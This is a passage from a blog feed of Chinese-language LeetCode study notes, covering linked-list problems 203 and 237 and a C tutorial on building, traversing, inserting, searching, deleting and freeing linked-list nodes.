class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Handle head node</span></span><br><span class="line">    <span class="keyword">while</span>(head!=<span class="literal">NULL</span> &amp;&amp; head-&gt;val==val)&#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span> &amp;&amp; ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;next-&gt;val == val)&#123;</span><br><span class="line">            ptr-&gt;next = ptr-&gt;next-&gt;next;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/203/result2.png"></p><p>對比先前的結果，又更進一步減少空間的使用</p><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><ul><li>時間複雜度: $O(n)$:  while迴圈這部分是traverse鏈結串列的主要邏輯。遍歷整個鏈結串列的時間複雜度是 $O(n)$，其中 <code>n</code> 是鏈結串列中的節點數量。在最壞情況下，每個節點都會被檢查一次，並且可能會被刪除</li><li>空間複雜度 $O(1)$: 這段程式碼不需要額外的數據結構來存儲鏈結串列或其部分，除了 <code>*ptr</code>, <code>*previous</code> 兩個指標變數，這些都是用於遍歷和操作鏈結串列的指針，佔用的是常數空間，即 $O(1)$，刪除節點時使用的臨時指標也屬於常數空間，因此整體空間複雜度依然是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刪除鏈結串列 | Medium | LeetCode#237 Delete Node in a Linked List</title>
      <link href="/posts/5efda43a.html"/>
      <url>/posts/5efda43a.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/237/question-1.png"></p><p><img src="/img/LeetCode/237/question-2.png"></p><p><img src="/img/LeetCode/237/question-3.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述: 如同圖中所述，題目中要求我們對一個 Single Linked List <code>head</code> 去實現一個刪除特定節點的函式，函式的輸入叫做 <code>node</code>，題目中有特別說明。</li><li>限制:<ul><li><code>node</code> 不會是 <code>head</code>中的最後一個節點，並且我們並不能夠存取 <code>head</code> 中的第一個元素，也就是整個 List 的初始節點。</li><li>這題的刪除節點不需要釋放記憶體，僅需將前一個節點連接到 <code>node</code> 的後一個節點</li></ul></li></ul><blockquote><p>在 Run 以及 Submit 的時候，題目會建好List 並且呼叫我們寫的function，來去進行測試，這題只需要專注在刪除節點的邏輯上就好</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始我陷入了傳統刪除節點的做法當中，也就是已知初始節點的條件下去走訪每個節點，指到找到給定節點，再去執行刪除的邏輯。</p><h3 id="傳統作法"><a href="#傳統作法" class="headerlink" title="傳統作法"></a>傳統作法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這種做法會<strong>需要知道 <code>node</code>的前一個節點，才有辦法指向到 <code>node</code>的下一個節點</strong>，但這題中，已知資訊只有 <code>node</code> 的位址，<strong>因此沒辦法知道前一個節點是誰。</strong></p><p><img src="/img/LeetCode/237/explain.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>面對這種狀況，可以換一個想法，<strong>可以把 <code>node</code> 後面節點的資料往前複製過來，持續進行，直到遇到NULL，也能夠實現一樣的效果</strong></p><p><img src="/img/LeetCode/237/solution.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">nextNode</span>, *<span class="title">current</span> =</span> node ;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line"></span><br><span class="line">        nextNode = current-&gt;next;</span><br><span class="line">        current-&gt;val = nextNode-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;next-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//update current pointer</span></span><br><span class="line">            current = nextNode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果如下:</p><p><img src="/img/LeetCode/237/result-1.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>其實有更加精簡的寫法，但時間複雜度其實沒什麼太大差異</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    node-&gt;val = node-&gt;next-&gt;val;</span><br><span class="line">    node-&gt;next = node-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果:<br><img src="/img/LeetCode/237/result-2.png"></p><blockquote><p>但好像多花費了 1ms, ….</p></blockquote><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p><strong>時間複雜度</strong>: $O(1)$: 本演算法包含固定數量的操作，像是更新當前節點的資料並更改其下一個指標，這些操作中的每一個都需要固定的時間，無論 Linked List 的大小如何。<br><strong>空間複雜度</strong>: $O(1)$: 這種刪除技術不需要任何額外的記憶體分配，因為它直接在現有節點上操作而無需建立額外的資料結構</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必備神器 | 鏈結串列 (Linked List) | LeetCode 筆記</title>
      <link href="/posts/c1fe4928.html"/>
      <url>/posts/c1fe4928.html</url>
      
        <content type="html"><![CDATA[<h1 id="鏈結串列-Linked-List-介紹"><a href="#鏈結串列-Linked-List-介紹" class="headerlink" title="鏈結串列(Linked List)介紹"></a>鏈結串列(Linked List)介紹</h1><p><img src="/img/LeetCode/Linked_List/linked_list.png"></p><p>Linked List 是一種常見的資料結構，其組成主要包含 <strong>資料</strong> 和 <strong>下一個節點的位址</strong>，因此構成節點與節點相互鏈結的結構，其中最後一個節點會指向到 NULL 這個位址。</p><p>我們實踐的主要方式還是透過 C 語言去操作，想要實現 Linked List 必須先透過 <code>struct</code> 來去先定義節點本身</p><h1 id="Linked-List-實踐"><a href="#Linked-List-實踐" class="headerlink" title="Linked List 實踐"></a>Linked List 實踐</h1><h2 id="定義節點"><a href="#定義節點" class="headerlink" title="定義節點"></a>定義節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br></pre></td></tr></table></figure><p>上面定義了 node 這個結構，其中包含了整數資料 <code>data</code>， 代表節點本身存放的資料 以及struct 型別的指標，下一個結構相同節點的記憶體位址 <code>next</code>。並且此結構的宣告為 <code>Node</code>，方便我們後續宣告節點。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br></pre></td></tr></table></figure><p>我們可以透過 Node 來去宣告三個指標，指向三個結構的記憶體位址，分別為 <code>first_node</code>, <code>current_node</code>, <code>previous_node</code>。這三個指標的用途:</p><ul><li><code>first_node</code> 用來指向鏈結的起始位址</li><li><code>current_node</code> 用來指向鏈結目前所在節點，通常再 traverse link 的時候很常用</li><li><code>previous_node</code> 用來指向current_node 的前一個節點，在建立節點或者反轉整個linked list 的時候很常用</li></ul><p>現在可以開始從0 建立鏈結。</p><h2 id="建立-Linked-List"><a href="#建立-Linked-List" class="headerlink" title="建立 Linked List"></a>建立 Linked List</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> node_numbers;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">  create_new_node(node_numbers);</span><br><span class="line">  current_node = first_node;</span><br><span class="line">  <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">    current_node=current_node-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的程式碼中，我們首先提供輸入來決定要建立的節點數量，接著呼叫 <code>create_new_node</code> 函式，並且從第一個節點依序印出節點資料和下一個節點的位址，最後透過 <code>current_node=current_node-&gt;next;</code> 來移動到下一個節點。</p><p>這裡最需要做的就是要建立 <code>create_new_node</code> 函式</p><h2 id="建立節點-Create-new-node"><a href="#建立節點-Create-new-node" class="headerlink" title="建立節點 (Create_new_node)"></a>建立節點 (<code>Create_new_node</code>)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在函式內，透過 <code>for loop</code> 來重複節點的建立</li><li>透過 malloc 動態分配具有 <code>Node</code> 大小空間，並將 current_node 指向其記憶體位址</li><li>讓使用者手動輸入 data 內容</li><li><code>current_node -&gt; data</code> 代表存取這個記憶體位址的 data 變數，這裡也是直接將手動輸入的資料值存放到節點中的data變數中</li><li>接著就是判斷是否是建立第一個節點，當建立第一個節點的時候，記得要更新 <code>first_node</code> 這個指標，確保指到當前節點，並且這時候也沒有前一個節點，因此也將 <code>previous_node</code> 更新為 <code>current_node</code> 也就是目前節點</li><li>如果開始建立後續的節點，則要讓前一個節點指向到目前節點的記憶體位址，才能夠鏈結起來，所以 <code>previous_node-&gt;next = current_node;</code></li><li>並且將 <code>current_node</code> 的下一個節點記憶體位址指向 NULL，所以 <code>current_node -&gt; next = NULL;</code></li><li>最後還需要更新 <code>previous_node</code> 為當前節點</li></ul><h2 id="印出節點-PrintList"><a href="#印出節點-PrintList" class="headerlink" title="印出節點 (PrintList)"></a>印出節點 (<code>PrintList</code>)</h2><p>在建立完節點，難免想要印出整個串列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主要邏輯就是讓從 first node 順著鏈結一直往下跑，所以將 <code>node = node -&gt; next</code> 直到遇到 Null</li><li>函式的輸入會式初始節點位址</li><li>需要判斷list是否為空</li></ul><p>接著在 main 函式呼叫即可印出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintList(first_node);</span><br></pre></td></tr></table></figure><h2 id="釋放記憶體"><a href="#釋放記憶體" class="headerlink" title="釋放記憶體"></a>釋放記憶體</h2><p>由於每個節點都是透過 <strong>malloc</strong> 進行動態宣告的，引此占用的記憶體位址在執行結束後要進行釋放，因此一樣需要檢索每個鏈結節點去進行 <code>free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函式傳入參數一樣會是初始節點的位址</li><li>一旦尚未到 NULL 的時候會需要將 當前節點丟到一個暫存的記憶體位址去進行 <code>free()</code>，如果直接 <code>free(current)</code> 則所存放的下一個節點的記憶體位址就找不到了</li><li>接著在讓當前節點繼續著 list 往下走 <code>current = current-&gt;next;</code></li></ul><h2 id="查找節點"><a href="#查找節點" class="headerlink" title="查找節點"></a>查找節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡函數的宣告型別也是用 <code>Node* </code> 因為回傳值會是一個結構指標，也就是節點的記憶體位址</li><li>傳入參數也需要傳輸 list 的初始節點位址，以及想要找的data值</li><li>一樣順著 Lists 找 (<code>node= node-&gt;next;</code>) 如果有找到節點的資料值等於 <code>item</code> 就回傳節點，直到遇到 Null 為止</li></ul><h2 id="插入節點"><a href="#插入節點" class="headerlink" title="插入節點"></a>插入節點</h2><p>插入節點這邊根據不同狀況分成不同函數處理:</p><ul><li>插入到 List 中間</li><li>插入到 List 的頭</li><li>插入到 List 的尾端</li></ul><h3 id="插中間"><a href="#插中間" class="headerlink" title="插中間"></a>插中間</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函數的傳入參數會是一個 node，並且還需要提供插入節點的資料值</li><li>接著就是新建立一個節點，為它分配記憶體空間</li><li>將新節點的 <code>data</code> 變數放入 <code>item</code> 這個資料值</li><li>將新結點的 <code>next</code> 放入原本輸入節點的下一個節點位址</li><li>將原本書入節點的 <code>next</code> 指向我們新建立的節點<br>這樣就完成插入節點的操作了</li></ul><h3 id="插頭"><a href="#插頭" class="headerlink" title="插頭"></a>插頭</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>因為是頭，所以輸入參數就直接給資料值就好</li><li>一樣建立新節點，並為其分配記憶體空間</li><li>將 <code>item</code> 放入新節點的 <code>data</code></li><li>將新節點的 <code>next</code> 指向到第一個節點</li><li>更新 <code>first_node</code> 為新的節點</li></ul><h3 id="插尾端"><a href="#插尾端" class="headerlink" title="插尾端"></a>插尾端</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>一樣輸入參數會是新節點的資料值</li><li>一樣建立新的節點，並且分配記憶體空間給他</li><li>將新節點的資料值給予 <code>item</code></li><li>將新節點的指標指向 NULL</li><li>接下來就是處理插入，但這樣會先進行一個例外處理，就是要先判斷 List是否為空，如果是空的就將 <code>first_node</code> 更新為我們新建立的 <code>new_node</code></li><li>若 list 非空，則需要先 traverse 整個 list 找到最後一個節點，所以將 <code>current_node</code> 更新為 <code>first_node</code></li><li>若尚未抵達最後一個節點，則繼續 traverse <code>current_node = current_node-&gt;next;</code></li><li>抵達最後節點後，將最後節點的指標值指向新建立的節點</li></ul><h2 id="刪除節點"><a href="#刪除節點" class="headerlink" title="刪除節點"></a>刪除節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>傳入參數會有，初始節點，以及要被刪除的節點</li><li>一開始一樣會需要判斷 <code>first_node</code> 是否為 null，如果是 null 也沒東西給你刪</li><li>接著一樣會分成不同情況處理，分別是<ul><li>刪除頭</li><li>刪除中間和尾端</li></ul></li><li>刪除頭的處理方式會是先更新 <code>first_node</code> 更新為它的下一個節點</li><li>接著直接使用 <code>free()</code> 釋放記憶體</li><li>再來就是當鏈結還沒抵達要被刪除的節點時，繼續 traverse  (<code>ptr = ptr-&gt;next</code>)</li><li>一旦找到了則將它的指標，先指向下一個節點的下一個節點位址</li><li>接著直接使用 <code>free()</code> 釋放記憶體</li></ul><h2 id="反轉鏈結串列-Reverse-Linked-List"><a href="#反轉鏈結串列-Reverse-Linked-List" class="headerlink" title="反轉鏈結串列 (Reverse Linked List)"></a>反轉鏈結串列 (Reverse 